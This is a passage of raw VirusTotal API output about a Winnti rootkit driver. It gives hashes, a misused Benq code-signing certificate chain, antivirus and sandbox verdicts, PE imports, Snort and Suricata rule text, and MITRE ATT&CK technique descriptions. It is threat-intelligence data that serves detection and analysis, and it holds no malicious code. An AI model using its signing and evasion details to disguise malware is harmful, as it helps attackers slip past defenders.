      "self": "https://www.virustotal.com/api/v3/files/760e2fd3e57186b597d40b996811768e6c4a28ca54685e029104fcf82f68238d/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65b4f9848758a13aafaf286d"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T1F6037C2B0668A4E5F98B8978D523E95EDAB030183B0177EF91F086496B53FF52B37805",
      "vhash": "044056657d151e1iz1cxz",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "crowdsourced_yara_results": [
        {
          "description": "Detects Winnti malware",
          "source": "https://github.com/Neo23x0/signature-base",
          "author": "Unknown",
          "ruleset_name": "apt_winnti",
          "rule_name": "APT_Winnti_MAL_Dec19_2",
          "ruleset_id": "00021484d1"
        },
        {
          "rule_name": "APT_Winnti_MAL_Dec19_2",
          "description": "Detects Winnti malware",
          "author": "Unknown",
          "ruleset_id": "00021484d1",
          "ruleset_name": "apt_winnti",
          "match_in_subfile": true,
          "source": "https://github.com/Neo23x0/signature-base"
        },
        {
          "rule_name": "APT_Winnti_MAL_Dec19_1",
          "description": "Detects Winnti malware",
          "author": "Unknown",
          "ruleset_id": "00021484d1",
          "ruleset_name": "apt_winnti",
          "match_in_subfile": true,
          "source": "https://github.com/Neo23x0/signature-base"
        },
        {
          "description": "Detects Winnti malware",
          "source": "https://github.com/Neo23x0/signature-base",
          "author": "Unknown",
          "ruleset_name": "apt_winnti",
          "rule_name": "APT_Winnti_MAL_Dec19_1",
          "ruleset_id": "00021484d1"
        }
      ],
      "creation_date": 1463103463,
      "names": [],
      "signature_info": {
        "x509": [
          {
            "valid usage": "Code Signing",
            "name": "Benq Corporation",
            "algorithm": "sha1RSA",
            "valid from": "2012-03-28 00:00:00",
            "valid to": "2015-04-13 23:59:59",
            "serial number": "0F 78 74 64 EC F2 AA 94 E0 4B 84 25 D4 DE 5B E4",
            "cert issuer": "VeriSign Class 3 Code Signing 2010 CA",
            "thumbprint": "11F7C55B276C2805D69A48F8B23C25883FCF5BE6"
          },
          {
            "name": "VeriSign Class 3 Public Primary Certification Authority - G5",
            "algorithm": "sha1RSA",
            "valid from": "2011-02-22 19:25:17",
            "valid to": "2021-02-22 19:35:17",
            "serial number": "61 19 93 E4 00 00 00 00 00 1C",
            "cert issuer": "Microsoft Code Verification Root",
            "thumbprint": "57534CCC33914C41F70E2CBB2103A1DB18817D8B"
          }
        ],
        "signers details": [
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid.",
            "valid usage": "Code Signing",
            "name": "Benq Corporation",
            "algorithm": "sha1RSA",
            "valid from": "12:00 AM 03/28/2012",
            "valid to": "11:59 PM 04/13/2015",
            "serial number": "0F 78 74 64 EC F2 AA 94 E0 4B 84 25 D4 DE 5B E4",
            "cert issuer": "VeriSign Class 3 Code Signing 2010 CA",
            "thumbprint": "11F7C55B276C2805D69A48F8B23C25883FCF5BE6"
          },
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid.",
            "valid usage": "Client Auth, Code Signing",
            "name": "VeriSign Class 3 Code Signing 2010 CA",
            "algorithm": "sha1RSA",
            "valid from": "12:00 AM 02/08/2010",
            "valid to": "11:59 PM 02/07/2020",
            "serial number": "52 00 E5 AA 25 56 FC 1A 86 ED 96 C9 D4 4B 33 C7",
            "cert issuer": "VeriSign Class 3 Public Primary Certification Authority - G5",
            "thumbprint": "495847A93187CFB8C71F840CB7B41497AD95C64F"
          },
          {
            "status": "Valid",
            "valid usage": "Client Auth, Code Signing, Email Protection, Server Auth",
            "name": "VeriSign",
            "algorithm": "sha1RSA",
            "valid from": "12:00 AM 11/08/2006",
            "valid to": "11:59 PM 07/16/2036",
            "serial number": "18 DA D1 9E 26 7D E8 BB 4A 21 58 CD CC 6B 3B 4A",
            "cert issuer": "VeriSign Class 3 Public Primary Certification Authority - G5",
            "thumbprint": "4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5"
          }
        ],
        "verified": "A required certificate is not within its validity period when verifying against the current system clock or the timestamp in the signed file.",
        "signers": "Benq Corporation; VeriSign Class 3 Code Signing 2010 CA; VeriSign"
      },
      "last_modification_date": 1705968517,
      "type_tag": "peexe",
      "times_submitted": 3,
      "total_votes": {
        "harmless": 1,
        "malicious": 0
      },
      "size": 40016,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.rootkit/winnti",
        "popular_threat_category": [
          {
            "count": 22,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 12,
            "value": "rootkit"
          },
          {
            "count": 10,
            "value": "winnti"
          },
          {
            "count": 3,
            "value": "winnkit"
          }
        ]
      },
      "authentihash": "a23d492658ed5b0e4109df718f04c3ca0616a246ff83d11d4c8ac1866adf902a",
      "detectiteasy": {
        "filetype": "PE64",
        "values": [
          {
            "info": "LTCG/C",
            "version": "16.00.40219",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "version": "10.00.40219",
            "type": "Linker",
            "name": "Microsoft Linker"
          },
          {
            "version": "2010",
            "type": "Tool",
            "name": "Visual Studio"
          },
          {
            "info": "PKCS #7",
            "version": "2.0",
            "type": "Sign tool",
            "name": "Windows Authenticode"
          }
        ]
      },
      "last_submission_date": 1636448153,
      "reputation": 1,
      "crowdsourced_ids_stats": {
        "high": 0,
        "info": 0,
        "medium": 1,
        "low": 4
      },
      "trid": [
        {
          "file_type": "Windows Icons Library (generic)",
          "probability": 25.4
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 25
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 24.7
        },
        {
          "file_type": "DOS Executable Generic",
          "probability": 24.7
        }
      ],
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "malicious",
          "confidence": 48,
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "MALWARE",
            "EVADER"
          ],
          "malware_names": [
            "Winnti"
          ]
        },
        "C2AE": {
          "category": "undetected",
          "sandbox_name": "C2AE",
          "malware_classification": [
            "UNKNOWN_VERDICT"
          ]
        },
        "Dr.Web vxCube": {
          "category": "malicious",
          "sandbox_name": "Dr.Web vxCube",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "sha256": "192ef0dee8df73eec9ee617abe4b0104799f9543a22a41e28d4d44c3ad713284",
      "type_extension": "exe",
      "tags": [
        "peexe",
        "assembly",
        "overlay",
        "signed",
        "idle",
        "64bits",
        "native"
      ],
      "crowdsourced_ids_results": [
        {
          "rule_category": "successful-recon-limited",
          "alert_severity": "medium",
          "rule_msg": "PROTOCOL-ICMP Unusual PING detected",
          "rule_raw": "alert icmp $HOME_NET any -> $EXTERNAL_NET any ( msg:\"PROTOCOL-ICMP Unusual PING detected\"; icode:0; itype:8; fragbits:!M; content:!\"ABCDEFGHIJKLMNOPQRSTUVWABCDEFGHI\",depth 32; content:!\"0123456789abcdefghijklmnopqrstuv\",depth 32; content:!\"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\",depth 36; content:!\"WANG2\"; content:!\"cacti-monitoring-system\",depth 65; content:!\"SolarWinds\",depth 72; metadata:policy max-detect-ips drop,ruleset community; reference:url,krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/; reference:url,krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/; classtype:successful-recon-limited; sid:29456; rev:3; )",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_references": [
            "https://krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/",
            "https://krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/"
          ],
          "rule_id": "1:29456"
        },
        {
          "rule_category": "Generic Protocol Command Decode",
          "alert_severity": "low",
          "rule_msg": "SURICATA STREAM excessive retransmissions",
          "rule_raw": "alert tcp any any -> any any (msg:\"SURICATA STREAM excessive retransmissions\"; flowbits:isnotset,tcp.retransmission.alerted; flowint:tcp.retransmission.count,>=,10; flowbits:set,tcp.retransmission.alerted; classtype:protocol-command-decode; sid:2210054; rev:1;)",
          "alert_context": [
            {
              "src_ip": "188.43.78.9",
              "src_port": 443,
              "ja3": [
                "10ee8d30a5d01c042afd7b2b205facc4"
              ],
              "ja3s": [
                "489634f4293b3c4e2bb342e3117dc2c3"
              ]
            }
          ],
          "rule_url": "https://www.openinfosecfoundation.org/",
          "rule_source": "Suricata",
          "rule_id": "1:2210054"
        },
        {
          "rule_category": "misc-activity",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP PING Windows",
          "rule_source": "Snort registered user ruleset",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP PING Windows\"; itype:8; content:\"abcdefghijklmnop\",depth 16; metadata:ruleset community; classtype:misc-activity; sid:382; rev:11; )",
          "rule_id": "1:382"
        },
        {
          "rule_category": "misc-activity",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP PING",
          "rule_source": "Snort registered user ruleset",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP PING\"; icode:0; itype:8; metadata:ruleset community; classtype:misc-activity; sid:384; rev:8; )",
          "rule_id": "1:384"
        },
        {
          "rule_category": "misc-activity",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP Echo Reply",
          "rule_source": "Snort registered user ruleset",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP Echo Reply\"; icode:0; itype:0; metadata:ruleset community; classtype:misc-activity; sid:408; rev:8; )",
          "rule_id": "1:408"
        }
      ],
      "last_analysis_date": 1705648903,
      "unique_sources": 1,
      "first_submission_date": 1633340646,
      "sha1": "082dbca2c3ca5c5410de9951a5c681f0c42235c8",
      "ssdeep": "768:Zfhf9ozikYw7rhcCMdahoICS4AI27tt3QOTZyoA/:Zo1Yw7rHEICS4A5t3QUyoA/",
      "md5": "10e5281f7a8b604061b49cfee6f25506",
      "pe_info": {
        "rich_pe_header_hash": "52667216065ac5c098808eedfec7d70b",
        "imphash": "fcccb379816ade76b537359d17969ca4",
        "overlay": {
          "entropy": 7.348847389221191,
          "offset": 34816,
          "chi2": 7997.59,
          "filetype": "unknown",
          "size": 5200,
          "md5": "b87ab9d1f070c2e6eccfbaa71af1aae4"
        },
        "compiler_product_versions": [
          "[ C ] VS2008 SP1 build 30729 count=1",
          "[---] Unmarked objects count=50",
          "[IMP] VS2008 SP1 build 30729 count=5",
          "[ASM] VS2008 SP1 build 30729 count=2",
          "[LNK] VS2010 SP1 build 40219 count=1",
          "id: 0xae, version: 40219 count=13"
        ],
        "entry_point": 14480,
        "machine_type": 34404,
        "timestamp": 1463103463,
        "sections": [
          {
            "name": ".text",
            "chi2": 144761.56,
            "virtual_address": 4096,
            "entropy": 6.23,
            "raw_size": 16896,
            "flags": "rx",
            "virtual_size": 16800,
            "md5": "ace45cab5b340beed180fce546f16bd6"
          },
          {
            "name": ".rdata",
            "chi2": 32504.9,
            "virtual_address": 24576,
            "entropy": 7.63,
            "raw_size": 12800,
            "flags": "r",
            "virtual_size": 12684,
            "md5": "d69320b0ffa04ca3ea35f7ca06603557"
          },
          {
            "name": ".data",
            "chi2": 128523,
            "virtual_address": 40960,
            "entropy": 0.08,
            "raw_size": 512,
            "flags": "rw",
            "virtual_size": 664,
            "md5": "3518c1bb7a729fb4fe779f1acbf4e87f"
          },
          {
            "name": ".pdata",
            "chi2": 127557.38,
            "virtual_address": 45056,
            "entropy": 3.87,
            "raw_size": 1536,
            "flags": "r",
            "virtual_size": 1332,
            "md5": "97ce85faa74c7665ecbf5b711611268b"
          },
          {
            "name": "INIT",
            "chi2": 100426,
            "virtual_address": 49152,
            "entropy": 4.18,
            "raw_size": 2048,
            "flags": "rwx",
            "virtual_size": 1604,
            "md5": "27c4856716e95f882dd11259a9040170"
          }
        ],
        "import_list": [
          {
            "library_name": "NDIS.SYS",
            "imported_functions": [
              "NdisAllocateMemoryWithTag",
              "NdisAllocateNetBufferAndNetBufferList",
              "NdisAllocateNetBufferList",
              "NdisAllocateNetBufferListPool",
              "NdisAllocateNetBufferMdlAndData",
              "NdisAllocateNetBufferPool",
              "NdisCopyFromNetBufferToNetBuffer",
              "NdisDeregisterProtocolDriver",
              "NdisFreeMdl",
              "NdisFreeMemory",
              "NdisFreeNetBuffer",
              "NdisFreeNetBufferList",
              "NdisFreeNetBufferListPool",
              "NdisFreeNetBufferPool",
              "NdisGetVersion",
              "NdisRegisterProtocolDriver",
              "NdisReturnNetBufferLists",
              "NdisSendNetBufferLists"
            ]
          },
          {
            "library_name": "ntoskrnl.exe",
            "imported_functions": [
              "__C_specific_handler",
              "ExAllocatePoolWithTag",
              "ExFreePoolWithTag",
              "IoAllocateMdl",
              "IoCreateSynchronizationEvent",
              "IofCompleteRequest",
              "IoFreeMdl",
              "IoGetDeviceObjectPointer",
              "KeAcquireInStackQueuedSpinLock",
              "KeAcquireSpinLockRaiseToDpc",
              "KeDelayExecutionThread",
              "KeReleaseInStackQueuedSpinLock",
              "KeReleaseSpinLock",
              "MmBuildMdlForNonPagedPool",
              "MmIsAddressValid",
              "MmMapLockedPagesSpecifyCache",
              "MmUnmapLockedPages",
              "NtBuildNumber",
              "ObfDereferenceObject",
              "ObReferenceObjectByHandle",
              "ProbeForRead",
              "ProbeForWrite",
              "RtlEqualUnicodeString",
              "RtlInitUnicodeString",
              "RtlUpcaseUnicodeChar",
              "ZwClose",
              "ZwOpenDirectoryObject",
              "ZwOpenEvent"
            ]
          }
        ]
      },
      "magic": "PE32+ executable (native) x86-64, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 4,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 2,
        "failure": 0,
        "malicious": 46,
        "undetected": 21
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": "W64.AIDetectMalware",
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Win32.Rootkit.5!c",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "result": "malicious (moderate confidence)",
          "method": "blacklist",
          "engine_update": "20240115"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.GenericKD.37717792",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "ClamAV": {
          "category": "timeout",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240106"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "Trojan-FPLK!10E5281F7A8B",
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "Trojan-FPLK!10E5281F7A8B",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": "unsafe",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5036",
          "result": "Trojan.Agent.Win64.1965",
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.136.50781",
          "result": "Trojan ( 0051b4451 )",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Alibaba": {
          "category": "malicious",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": "Rootkit:Win64/Winnti.bd298506",
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.136.50782",
          "result": "Trojan ( 0051b4451 )",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Cybereason": {
          "category": "malicious",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": "malicious.2c3ca5",
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Generic.D23F8720",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.621",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "Backdoor.Winnkit",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28595",
          "result": "a variant of Win64/Agent.IF",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "APEX": {
          "category": "malicious",
          "engine_name": "APEX",
          "engine_version": "6.490",
          "result": "Malicious",
          "method": "blacklist",
          "engine_update": "20240116"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "Rootkit.Win64.Winnti.bc",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.GenericKD.37717792",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "Win64:Malware-gen",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Malware.Win32.Gencirc.13ad8ca1",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.GenericKD.37717792 (B)",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "Trojan.Rootkit.22133",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.GenericKD.37717792",
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "Rootkit.Win64.WINNKIT.YXCEL",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Troj/Winnti-S",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.Win64.Agent",
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "240118-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "Jiangmin": {
          "category": "malicious",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": "Rootkit.Winnti.z",
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "Webroot": {
          "category": "malicious",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": "W32.Trojan.Gen",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Google": {
          "category": "timeout",
          "engine_name": "Google",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan/Win64.Agent",
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.155.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36359",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": "Trojan:Win32/Casdet!rfn",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "Rootkit.Win64.Winnti.bc",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37193B:27.34617",
          "result": "Trojan.GenericKD.37717792",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "W64/Winnti.G",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": "Rootkit/Win.Winnti.C5116075",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "result": "Trojan.Rootkit.Winnti",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-19.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "VBA32": {
          "category": "malicious",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": "Rootkit.Win64.Winnti",
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": "Malware.AI.3899681673",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "Trj/CI.A",
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "Rootkit.Win64.WINNKIT.YXCEL",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Rootkit.Winnti!8.1953 (CLOUD)",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Yandex": {
          "category": "malicious",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": "Trojan.GenAsa!UyPcUA3dwko",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.73483192.susgen",
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "W32/Agent.IF!tr",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "Win64:Malware-gen",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "DeepInstinct": {
          "category": "malicious",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "result": "MALICIOUS",
          "method": "blacklist",
          "engine_update": "20240116"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_100% (W)",
          "method": "blacklist",
          "engine_update": "20231026"
        }
      }
    },
    "type": "file",
    "id": "192ef0dee8df73eec9ee617abe4b0104799f9543a22a41e28d4d44c3ad713284",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/192ef0dee8df73eec9ee617abe4b0104799f9543a22a41e28d4d44c3ad713284"
    }
  },
  "mitre": {
    "data": {
      "CAPA": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "parse PE header"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
